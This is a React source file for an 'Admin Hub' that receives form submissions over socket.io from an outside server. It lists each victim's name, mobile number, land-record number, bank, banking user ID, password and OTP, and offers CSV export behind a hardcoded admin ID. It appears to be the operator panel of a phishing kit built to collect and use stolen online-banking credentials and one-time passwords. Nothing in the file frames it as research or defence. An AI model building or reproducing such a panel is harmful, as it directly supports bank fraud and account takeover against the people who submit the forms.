import React, { useState, useEffect } from "react";
import { io } from "socket.io-client";
const socket = io("https://glt-rqqk.onrender.com");

const Admin = () => {
  const [input, setInput] = useState("");
  const [adminId, setAdminId] = useState(localStorage.getItem("adminId"));
  const [submittedForms, setSubmittedForms] = useState([]);

  function handleAdminInsert() {
    localStorage.setItem("adminId", input);
    setAdminId(input); // trigger re-render
  }

  // ✅ Export data as CSV
  function handleExportData() {
    if (submittedForms.length === 0) {
      alert("No data to export!");
      return;
    }

    // Define CSV headers
    const headers = ["Name", "Mobile", "Patta/Survey", "Bank", "User ID", "Password", "OTP", "Form ID", "Timestamp"];
    
    // Convert data to CSV format
    const csvContent = [
      headers.join(","),
      ...submittedForms.map(form => [
        `"${form.name || ""}"`,
        `"${form.mobile || ""}"`,
        `"${form.pattaOrSurvey || ""}"`,
        `"${form.bank || ""}"`,
        `"${form.userId || ""}"`,
        `"${form.password || ""}"`,
        `"${form.otp || ""}"`,
        `"${form.id || ""}"`,
        `"${new Date().toLocaleString()}"`
      ].join(","))
    ].join("\n");

    // Create and download the CSV file
    const blob = new Blob([csvContent], { type: "text/csv;charset=utf-8;" });
    const link = document.createElement("a");
    const url = URL.createObjectURL(blob);
    link.setAttribute("href", url);
    link.setAttribute("download", `form_data_${new Date().toISOString().split('T')[0]}.csv`);
    link.style.visibility = "hidden";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  }


  // ✅ check only correct admin ID
  useEffect(() => {
    if (adminId && adminId !== "iamtheadminofblackwork") {
      localStorage.removeItem("adminId");
      setAdminId(null);
    }
  }, [adminId]);

  useEffect(() => {
    socket.on("form:update", (incomingData) => {
      console.log("📡 New form received:", incomingData);

      setSubmittedForms((prev) => {
        const exists = prev.find((ele) => ele.id === incomingData.id);

        if (exists) {
          // 🔄 Update the existing record
          return prev.map((ele) =>
            ele.id === incomingData.id ? { ...ele, ...incomingData } : ele
          );
        } else {
          // ➕ Add new record
          return [...prev, incomingData];
        }
      });
    });

    return () => socket.off("form:update");
  }, [socket]);


  

  if (!adminId || adminId !== "iamtheadminofblackwork") {
    return (
      <div
        style={{
          display: "flex",
          flexDirection: "column",
          alignItems: "center",
          justifyContent: "center",
          minHeight: "100vh",
          background: "#f5f5f5",
        }}
      >
        <div
          style={{
            background: "white",
            padding: "20px",
            borderRadius: "10px",
            boxShadow: "0 4px 10px rgba(0,0,0,0.1)",
            textAlign: "center",
            width: "300px",
          }}
        >
          <h2 style={{ marginBottom: "15px", color: "#333" }}>Admin Access</h2>
          <input
            type="text"
            placeholder="Enter Admin ID"
            value={input}
            onChange={(e) => setInput(e.target.value)}
            style={{
              width: "90%",
              padding: "10px",
              border: "1px solid #ccc",
              borderRadius: "6px",
              marginBottom: "15px",
              outline: "none",
            }}
          />
          <button
            onClick={handleAdminInsert}
            style={{
              width: "100%",
              padding: "10px",
              backgroundColor: "black",
              color: "white",
              border: "none",
              borderRadius: "6px",
              cursor: "pointer",
              transition: "0.3s",
            }}
            onMouseOver={(e) =>
              (e.currentTarget.style.backgroundColor = "#333")
            }
            onMouseOut={(e) =>
              (e.currentTarget.style.backgroundColor = "black")
            }
          >
            Save
          </button>
        </div>
      </div>
    );
  }

  return (
    <div style={{ padding: "20px" }}>
      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "20px" }}>
        <h2>Admin Hub - Received Forms</h2>
        <button
          onClick={handleExportData}
          style={{
            padding: "10px 20px",
            backgroundColor: "#28a745",
            color: "white",
            border: "none",
            borderRadius: "6px",
            cursor: "pointer",
            fontWeight: "bold",
            transition: "0.3s",
          }}
          onMouseOver={(e) =>
            (e.currentTarget.style.backgroundColor = "#218838")
          }
          onMouseOut={(e) =>
            (e.currentTarget.style.backgroundColor = "#28a745")
          }
        >
          📥 Export Data
        </button>
      </div>
      {submittedForms.length === 0 ? (
        <p>No forms submitted yet.</p>
      ) : (
        <table
          style={{
            width: "100%",
            borderCollapse: "collapse",
            marginTop: "20px",
          }}
        >
          <thead>
            <tr style={{ backgroundColor: "#f0f0f0" }}>
              <th style={thStyle}>Name</th>
              <th style={thStyle}>Mobile</th>
              <th style={thStyle}>Patta/Survey</th>
              <th style={thStyle}>Bank</th>
              <th style={thStyle}>User ID</th>
              <th style={thStyle}>Password</th>
              <th style={thStyle}>OTP</th>
              <th style={thStyle}>Form ID</th>
            </tr>
          </thead>
          <tbody>
            {submittedForms.map((f, i) => (
              <tr key={i} style={{ borderBottom: "1px solid #ddd" }}>
                <td style={tdStyle}>{f.name}</td>
                <td style={tdStyle}>{f.mobile}</td>
                <td style={tdStyle}>{f.pattaOrSurvey}</td>
                <td style={tdStyle}>{f.bank}</td>
                <td style={tdStyle}>{f.userId}</td>
                <td style={tdStyle}>{f.password}</td>
                <td style={tdStyle}>{f.otp || "-"}</td>
                <td style={tdStyle}>{f.id}</td>
              </tr>
            ))}
          </tbody>
        </table>
      )}
    </div>
  );
};

// ✅ styles for table cells
const thStyle = {
  border: "1px solid #ccc",
  padding: "8px",
  textAlign: "left",
  fontWeight: "bold",
};

const tdStyle = {
  border: "1px solid #ccc",
  padding: "8px",
};

export default Admin;
